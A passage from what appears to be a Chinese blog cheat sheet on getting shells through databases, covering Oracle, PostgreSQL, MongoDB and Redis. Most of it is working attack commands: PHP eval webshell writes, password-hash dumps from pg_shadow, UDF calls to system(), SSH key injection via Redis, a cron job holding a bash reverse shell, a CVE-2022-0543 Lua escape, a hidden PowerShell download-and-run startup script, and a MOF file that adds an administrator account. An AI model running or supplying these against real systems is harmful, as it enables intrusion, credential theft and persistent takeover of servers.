System.out.println(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* public static void main(String[] args)&#123;</span></span><br><span class="line"><span class="comment">      list_cmd(args[0]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    **/</span></span><br><span class="line">&#125;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>

<blockquote>
<p>创建存储过程</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create or replace procedure p_exe_linux(str varchar2) as language java</span><br><span class="line">name &#39;Test.list_cmd(java.lang.String)&#39;;</span><br><span class="line">&#x2F;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>命令执行</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET SERVEROUTPUT ON</span><br><span class="line">exec dbms_java.set_output(1111111111111);</span><br><span class="line">EXEC P_EXE_LINUX(&#39;whoami&#39;);</span><br></pre></td></tr></table></figure>



<h1 id="POSTGRESQL"><a href="#POSTGRESQL" class="headerlink" title="POSTGRESQL"></a>POSTGRESQL</h1><h2 id="PostgreSQL-GetShell"><a href="#PostgreSQL-GetShell" class="headerlink" title="PostgreSQL GetShell"></a>PostgreSQL GetShell</h2><h3 id="Copy-To-写入Shell"><a href="#Copy-To-写入Shell" class="headerlink" title="Copy To 写入Shell"></a>Copy To 写入Shell</h3><blockquote>
<p>前提需要满足的条件。</p>
</blockquote>
<ul>
<li>知道网站的<code>绝对路径</code></li>
<li>有Web目录的<code>写入</code>权限</li>
</ul>
<blockquote>
<p>Copy To file</p>
</blockquote>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">copy</span>  (<span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>) <span class="keyword">to</span> <span class="string">&#x27;/tmp/1.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="LO-CREATE写入Shell"><a href="#LO-CREATE写入Shell" class="headerlink" title="LO_CREATE写入Shell"></a>LO_CREATE写入Shell</h3><blockquote>
<p>利用分片进行上传，首先创建一个 OID 作为写入的对象, 然后通过 0,1,2,3… 分片上传但是对象都为 12345 最后导出到 / tmp 目录下, 收尾删除 OID</p>
</blockquote>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> lo_create(<span class="number">12345</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">0</span>, decode(<span class="string">&#x27;7f454c4...0000&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">1</span>, decode(<span class="string">&#x27;0000000...0000&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">2</span>, decode(<span class="string">&#x27;f604000...0000&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">3</span>, decode(<span class="string">&#x27;0000000...7400&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">SELECT</span> lo_export(<span class="number">12345</span>, <span class="string">&#x27;/tmp/test.so&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> lo_unlink(<span class="number">12345</span>);</span><br></pre></td></tr></table></figure>

<h3 id="CVE-2018-1058"><a href="#CVE-2018-1058" class="headerlink" title="CVE-2018-1058"></a>CVE-2018-1058</h3><h3 id="CVE-2019-9193"><a href="#CVE-2019-9193" class="headerlink" title="CVE-2019-9193"></a>CVE-2019-9193</h3><h2 id="PostgreSQL提权"><a href="#PostgreSQL提权" class="headerlink" title="PostgreSQL提权"></a>PostgreSQL提权</h2><blockquote>
<p>udf调用本地so文件,或者自己上传so命令执行.</p>
<p>一般8.2以下的版本可以</p>
</blockquote>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> <span class="keyword">system</span>(<span class="type">cstring</span>) <span class="keyword">RETURNS</span> <span class="type">int</span> <span class="keyword">AS</span> <span class="string">&#x27;/lib/libc.so.6&#x27;</span>, <span class="string">&#x27;system&#x27;</span> <span class="keyword">LANGUAGE</span> C <span class="keyword">STRICT</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> <span class="keyword">system</span>(<span class="type">cstring</span>) RcETURNS <span class="type">int</span> <span class="keyword">AS</span> <span class="string">&#x27;/lib64/libc.so.6&#x27;</span>, <span class="string">&#x27;system&#x27;</span> <span class="keyword">LANGUAGE</span> C <span class="keyword">STRICT</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">system</span>(<span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="Other-1"><a href="#Other-1" class="headerlink" title="Other"></a>Other</h2><blockquote>
<p>查询密码</p>
</blockquote>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> usename, passwd <span class="keyword">FROM</span> pg_shadow;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>PostgreSQL读取文件</p>
</blockquote>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 方法一</span></span><br><span class="line"><span class="keyword">select</span> pg_read_file(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> testaaaa;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> testaaaa(t <span class="type">TEXT</span>);</span><br><span class="line"><span class="keyword">copy</span> testaaaa <span class="keyword">from</span> <span class="string">&#x27;/etc/passwd&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> testaaaa <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--方法二</span></span><br><span class="line"><span class="keyword">Select</span> lo_import(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="number">12345678</span>);</span><br><span class="line"><span class="keyword">select</span> array_agg(b)::<span class="type">text</span>::<span class="type">int</span> <span class="keyword">from</span>(<span class="keyword">select</span> encode(data,<span class="string">&#x27;hex&#x27;</span>)b,pageno <span class="keyword">from</span> pg_largeobject <span class="keyword">where</span> loid=<span class="number">12345678</span> <span class="keyword">order</span> <span class="keyword">by</span> pageno</span><br></pre></td></tr></table></figure>

<blockquote>
<p>列目录</p>
</blockquote>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> pg_ls_dir(<span class="string">&#x27;/etc&#x27;</span>);</span><br></pre></td></tr></table></figure>



<h1 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h1><blockquote>
<p><em>MongoDB</em>是一个<em>安全</em>性相对较高的非关系型数据库，它的<em>安全</em>问题主要出现在使用、配置过程当中，如未授权访问，弱密码。</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/codingo/</span>NoSQLMap</span><br></pre></td></tr></table></figure>



<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><h2 id="Redis-GetShell"><a href="#Redis-GetShell" class="headerlink" title="Redis GetShell"></a>Redis GetShell</h2><h3 id="Redis写Webshell"><a href="#Redis写Webshell" class="headerlink" title="Redis写Webshell"></a>Redis写Webshell</h3><blockquote>
<p>前提需要满足的条件。</p>
</blockquote>
<ul>
<li>知道网站的<code>绝对路径</code></li>
<li>具有系统超级管理员权限</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 设置Redis 服务器快照文件目录为Web目录</span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/ </span><br><span class="line"># 将 Redis 服务器的快照文件名设置为 <span class="number">1</span>.php</span><br><span class="line">config <span class="built_in">set</span> dbfilename test.php</span><br><span class="line"># 这里的\r\n\r\代表换行的意思，用redis写入文件的会自带一些版本信息，不换行可能会导致无法执行。</span><br><span class="line"><span class="built_in">set</span> xxx &quot;\r\n\r\&lt;?php @eval($_POST[&#x27;test&#x27;]);?&gt;\r\n\r\&quot; </span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<h3 id="Redis-写SSH公钥"><a href="#Redis-写SSH公钥" class="headerlink" title="Redis 写SSH公钥"></a>Redis 写SSH公钥</h3><blockquote>
<p>前提需要满足的条件。</p>
</blockquote>
<ul>
<li>目标机器开启<code>SSH</code>服务，且可远程连接</li>
<li>运行Redis的用户为<code>root</code>用户</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 把公钥导入key.txt，前后添加\n\n防止写入的公钥乱码导致不可用</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; 1.txt</span><br><span class="line">cat 1.txt | redis-cli -h 127.0.0.1 -p 6379 -x <span class="built_in">set</span> crackit</span><br><span class="line"><span class="comment"># 连接Redis</span></span><br><span class="line">redis-cli -h 127.0.0.1 -p 6379 </span><br><span class="line"><span class="comment"># 把目录设为/root/.ssh/</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dir /root/.ssh/</span><br><span class="line"><span class="comment"># 查看目录</span></span><br><span class="line">127.0.0.1:6379&gt; config get dir</span><br><span class="line"><span class="comment"># 文件名设置为authorized_keys</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dbfilename <span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line"><span class="comment"># 保存</span></span><br><span class="line">127.0.0.1:6379&gt; save</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 使用ssh连接</span></span><br><span class="line">ssh root@127.0.0.1 -p 22 -i /root/.ssh/id_rsa</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="主从复制GetShell"><a href="#主从复制GetShell" class="headerlink" title="主从复制GetShell"></a>主从复制GetShell</h3><blockquote>
<p>前提需要满足的条件。</p>
</blockquote>
<ul>
<li><code>Redis 4.x</code>以后才可以使用外部扩展功能。</li>
<li><code>Redis4.x&lt;=Redi5.0.5</code></li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">redis-rogue-server</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1</span><br></pre></td></tr></table></figure>



<h3 id="计划任务GetShell"><a href="#计划任务GetShell" class="headerlink" title="计划任务GetShell"></a>计划任务GetShell</h3><blockquote>
<p>前提需要满足的条件</p>
</blockquote>
<ul>
<li>仅限<code>CentOS</code>可用</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个名为xx的键，值设置为每分钟反弹shell的命令</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> xx <span class="string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/6336 0&gt;&amp;1\n&quot;</span></span><br><span class="line"><span class="comment"># 设置Redis服务器快照文件目录为计划任务的配置文件目录</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line"><span class="comment"># 快照文件名称为root，也就是写入/var/spool/cron/root</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dbfilename root</span><br><span class="line"><span class="comment"># 保存</span></span><br><span class="line">127.0.0.1:6379&gt; save</span><br></pre></td></tr></table></figure>



<h3 id="CVE-2022-0543沙盒逃逸GetShell"><a href="#CVE-2022-0543沙盒逃逸GetShell" class="headerlink" title="CVE-2022-0543沙盒逃逸GetShell"></a>CVE-2022-0543沙盒逃逸GetShell</h3><blockquote>
<p>前提需要满足的条件</p>
</blockquote>
<ul>
<li>Ubuntu系统</li>
<li>2.2 &lt;= redis &lt; 5.0.13</li>
<li>2.2 &lt;= redis &lt; 6.0.15</li>
<li>2.2 &lt;= redis &lt; 6.2.5</li>
</ul>
<blockquote>
<p>需要知道package.loadlib的路径</p>
<p>利用luaopen_io函数</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span> <span class="string">&#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;whoami&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27;</span> 0</span><br></pre></td></tr></table></figure>



<h2 id="Windows-Getshell"><a href="#Windows-Getshell" class="headerlink" title="Windows Getshell"></a>Windows Getshell</h2><blockquote>
<p>Redis官方是不建议在Windows下使用Redis的，且微软维护的Windwos开源版本只有3.X。</p>
</blockquote>
<h3 id="Windows写入WebShell"><a href="#Windows写入WebShell" class="headerlink" title="Windows写入WebShell"></a>Windows写入WebShell</h3><blockquote>
<p>前提需要满足的条件</p>
</blockquote>
<ul>
<li>知道网站的<code>绝对路径</code></li>
<li>具有系统超级管理员权限</li>
</ul>
<blockquote>
<p>和Linux一样写入文件就行了</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dir C:\phpstudy_pro\WWW\</span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dbfilename test.php</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> xxx <span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;test&#x27;]);?&gt;&quot;</span> </span><br><span class="line">127.0.0.1:6379&gt; save</span><br></pre></td></tr></table></figure>



<h3 id="Windows写入启动项"><a href="#Windows写入启动项" class="headerlink" title="Windows写入启动项"></a>Windows写入启动项</h3><blockquote>
<p>前提需要满足的条件</p>
</blockquote>
<ul>
<li>知道服务器用户名一般为<code>Administrator</code></li>
<li>具有系统超级管理员权限</li>
<li>需要服务器<code>重启</code>，<code>重启!!</code></li>
</ul>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="builtin-name">set</span> dir <span class="string">&quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;</span></span><br><span class="line">config <span class="builtin-name">set</span> dbfilename 1.bat</span><br><span class="line"><span class="builtin-name">set</span> xxx <span class="builtin-name">set</span> x <span class="string">&quot;/r/n/r/npowershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://127.0.0.1/a&#x27;))\&quot;/r/n/r/n</span></span><br><span class="line"><span class="string">save</span></span><br></pre></td></tr></table></figure>



<h3 id="Windows-写入mof"><a href="#Windows-写入mof" class="headerlink" title="Windows 写入mof"></a>Windows 写入mof</h3><blockquote>
<p>mof是windows系统的一个文件（在<code>c:/windows/system32/wbem/mof/nullevt.mof</code>）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。其实就是有了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p>
<p>也就是说在<code>c:/windows/system32/wbem/mof/</code>目录下的mof文件会每5秒自动执行一次，这样就不需要重启机器就能获取权限了。</p>
</blockquote>
<blockquote>
<p>保存如下代码为 <code>admin.txt</code> 文件:</p>
</blockquote>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\.\root\subscription&quot;) instance of __EventFilter as $EventFilter &#123; EventNamespace = &quot;Root\Cimv2&quot;; Name  = &quot;filtP2&quot;; Query = &quot;Select * From __InstanceModificationEvent &quot; &quot;Where TargetInstance Isa &quot;Win32_LocalTime&quot; &quot; &quot;And TargetInstance.Second = 5&quot;; QueryLanguage = &quot;WQL&quot;; &#125;; instance of ActiveScriptEventConsumer as $Consumer &#123; Name = &quot;consPCSV2&quot;; ScriptingEngine = &quot;JScript&quot;; ScriptText = &quot;var WSH = new ActiveXObject(&quot;WScript.Shell&quot;)nWSH.run(&quot;net.exe user admin admin /add&quot;)&quot;; &#125;; instance of __FilterToConsumerBinding &#123; Consumer   = $Consumer; Filter = $EventFilter; &#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>执行如下命令</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e &quot;nn&quot;; cat admin.txt; <span class="built_in">echo</span> -e &quot;nn&quot;) &gt; foo.txt</span><br></pre></td></tr></table></figure>

<blockquote>
<p>然后再执行如下命令</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat foot.txt | redis-cli -h 127.0.0.1 -x <span class="built_in">set</span> x</span><br><span class="line">redis-cli -h 127.0.0.1</span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dir c:/windows/system32/wbem/mof/</span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dbfilename admin1.mof</span><br><span class="line">127.0.0.1:6379&gt; save</span><br></pre></td></tr></table></figure>


	  <div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>

	</div>

	
	<span id="/post/DBGetShell/" class="leancloud-visitors view" data-flag-title="DBGetShell">
		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/post/ExchangeAttack/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>

    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-01-07 
	</div>
	

	<!-- categories -->
    

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Mysql"><span class="toc-article-text">Mysql</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Mysql-GetShell"><span class="toc-article-text">Mysql GetShell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#INTO-OUTFILE-Get-WebShell"><span class="toc-article-text">INTO OUTFILE Get WebShell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%85%A2%E6%97%A5%E5%BF%97%E5%86%99-WebShell"><span class="toc-article-text">慢日志写 WebShell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-article-text">身份认证绕过</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Mysql-%E6%8F%90%E6%9D%83"><span class="toc-article-text">Mysql 提权</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#UDP%E6%8F%90%E6%9D%83"><span class="toc-article-text">UDP提权</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#MOF%E6%8F%90%E6%9D%83"><span class="toc-article-text">MOF提权</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-article-text">启动项提权</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2016-6663"><span class="toc-article-text">CVE-2016-6663</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Other"><span class="toc-article-text">Other</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#MSSQL"><span class="toc-article-text">MSSQL</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#MSSQL-GetShell"><span class="toc-article-text">MSSQL GetShell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#MSSQL-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86"><span class="toc-article-text">MSSQL 权限划分</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9E%E8%B7%AF%E5%BE%84"><span class="toc-article-text">寻找真实路径</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#xp-cmdshell-Get-Shell"><span class="toc-article-text">xp_cmdshell Get Shell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%97%A5%E5%BF%97%E5%A4%87%E4%BB%BD-Get-Shell-%E6%8E%A8%E8%8D%90"><span class="toc-article-text">日志备份 Get Shell[推荐]</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BD-GetShell"><span class="toc-article-text">差异备份 GetShell</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#MSSQL-%E6%8F%90%E6%9D%83"><span class="toc-article-text">MSSQL 提权</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#xp-cmdshell"><span class="toc-article-text">xp_cmdshell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#sp-oacreate"><span class="toc-article-text">sp_oacreate</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%B2%99%E7%9B%92%E6%8F%90%E6%9D%83"><span class="toc-article-text">沙盒提权</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#OLE-AUTOMATION-PROCEDURES%E6%8F%90%E6%9D%83"><span class="toc-article-text">OLE AUTOMATION PROCEDURES提权</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#JOBAGENT%E6%8F%90%E6%9D%83"><span class="toc-article-text">JOBAGENT提权</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CLR%E6%8F%90%E6%9D%83"><span class="toc-article-text">CLR提权</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#ORACLE"><span class="toc-article-text">ORACLE</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Oracle-Getshell"><span class="toc-article-text">Oracle Getshell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#JAVA%E5%87%BD%E6%95%B0%E6%8F%90%E6%9D%83"><span class="toc-article-text">JAVA函数提权</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#POSTGRESQL"><span class="toc-article-text">POSTGRESQL</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PostgreSQL-GetShell"><span class="toc-article-text">PostgreSQL GetShell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Copy-To-%E5%86%99%E5%85%A5Shell"><span class="toc-article-text">Copy To 写入Shell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#LO-CREATE%E5%86%99%E5%85%A5Shell"><span class="toc-article-text">LO_CREATE写入Shell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2018-1058"><span class="toc-article-text">CVE-2018-1058</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2019-9193"><span class="toc-article-text">CVE-2019-9193</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PostgreSQL%E6%8F%90%E6%9D%83"><span class="toc-article-text">PostgreSQL提权</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Other-1"><span class="toc-article-text">Other</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#MongoDB"><span class="toc-article-text">MongoDB</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Redis"><span class="toc-article-text">Redis</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Redis-GetShell"><span class="toc-article-text">Redis GetShell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Redis%E5%86%99Webshell"><span class="toc-article-text">Redis写Webshell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Redis-%E5%86%99SSH%E5%85%AC%E9%92%A5"><span class="toc-article-text">Redis 写SSH公钥</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6GetShell"><span class="toc-article-text">主从复制GetShell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1GetShell"><span class="toc-article-text">计划任务GetShell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2022-0543%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8GetShell"><span class="toc-article-text">CVE-2022-0543沙盒逃逸GetShell</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Windows-Getshell"><span class="toc-article-text">Windows Getshell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Windows%E5%86%99%E5%85%A5WebShell"><span class="toc-article-text">Windows写入WebShell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Windows%E5%86%99%E5%85%A5%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-article-text">Windows写入启动项</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Windows-%E5%86%99%E5%85%A5mof"><span class="toc-article-text">Windows 